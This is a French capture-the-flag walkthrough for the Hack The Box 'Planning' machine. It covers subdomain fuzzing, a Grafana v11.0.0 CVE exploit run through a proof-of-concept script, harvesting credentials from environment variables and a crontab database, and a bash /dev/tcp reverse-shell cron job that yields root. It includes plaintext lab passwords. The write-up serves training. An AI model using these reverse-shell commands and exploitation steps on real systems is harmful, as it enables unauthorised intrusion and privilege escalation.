## Énumération

**nmap**

![[Machine/Planning/file/nmap.png]]

le port **80** est ouvert donc on va analyser la page web du serveur:
![[site.png]]

Maintenant nous allons l'outils **FFUF** pour énumérer les **sous-domaines**:
```
ffuf -u http://planning.htb -H "Host:FUZZ.planning.htb" -w /usr/share/SecLists/Discovery/DNS/namelist.txt -fs 178 -t 100
```

![[sousDomaines.png]]

Nous avons donc trouver un **sous-domaine** appelé **grafana**. On va y accéder via notre navigateur et s'y connecter avec les **logins** donnés préalablement:

![[grafana.png]]

En cliquant sur le **"?"** en haut à droite, nous pouvons trouver la version de grafana qui est la version `Grafana v11.0.0`. Il se trouve que cette version a une vulnérabilité connue.

## Exploitation du CVE

![[CVE_grafana.png]]

Nous devons maintenant télécharger le fichier **poc.py**.

Maintenant il faut ouvrir un serveur en écoute:
```
nc -nvlp 9001
```

puis exécuter le fichier **poc.py**
```
python poc.py --url http://grafana.planning.htb:80 --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.14.95 --reverse-port 9001
```
![[connexio.png]]

Une fois connecter et après quelques recherches, les seules choses intéressante sont trouvées pendant la lecture des **variables d'environnements**   
```
env
```
![[env.png]]


## SSH sur enzo
Nous pouvons trouver ici un nom d'utilisateur: **enzo**, et un **mot de passe**. Nous pouvons donc se connecter via **SSH** avec ces logins:

```
ssh enzo@10.10.11.68
```

On peut maintenant ouvrir le fichier **user.txt** pour avoir l' **user flag**

## Élévation de privilèges

Pour rechercher d'éventuelles possibilités d' élévation de privilège, nous allons utiliser **linpeas**. Il faut d'abord rendre le script exécutable :

```
chmod +x linpeas.sh
```

Lancer **linpeas**: `./linpeas.sh`

![[linpeas.png]]

En faisant des recherches dans le résultat, le fichier **/opt/crontabs/crontab.db** peut contenir des informations d'identification ou exposer un nouveau vecteur d'attaque.

![[crontab.png]]
On va maintenant ouvrir le fichier:
```
cat /opt/crontabs/crontab.db
```

![[catCrontab.png]]

Là, on a pu trouver les identifiants **root** avec le mot de passe : `P4ssw0rdS0pRi0T3c`

Il semble aussi qu'un **serveur web** fonctionne sur le port 8000
![[activePort.png]]

Configurons la redirection de port vers notre propre machine pour accéder au service sur le port 8000:
```
ssh -L 8000:localhost:8000 enzo@planning.htb
```

Ensuite, nous allons sur **localhost:8000** dans un navigateur web. Un nom d'utilisateur et un mot de passe sont demandés.  
Utilisons le mot de passe trouvé dans le fichier crontab.db et le nom d'utilisateur **root** .
![[crontWeb.png]]

Exécutons une nouvelle analyse en suivant les étapes suivantes pour obtenir un shell inversé.  
Cliquez sur **« NOUVEAU »** et entrer:

```
bash -c 'exec bash -i &>/dev/tcp/10.10.14.99/8888 <&1'
```
![[bash.png]]

Avant d'enregistrer, nous devons d'abord ouvrir une entrée:

```
nc -nvlp 8888
```

On peut maintenant enregistrer le job qu'on a ajouter et l'exécuter pour avoir un accès **root** :

On a plus qu'à taper `cat root/root.txt` pour avoir le **root flag**





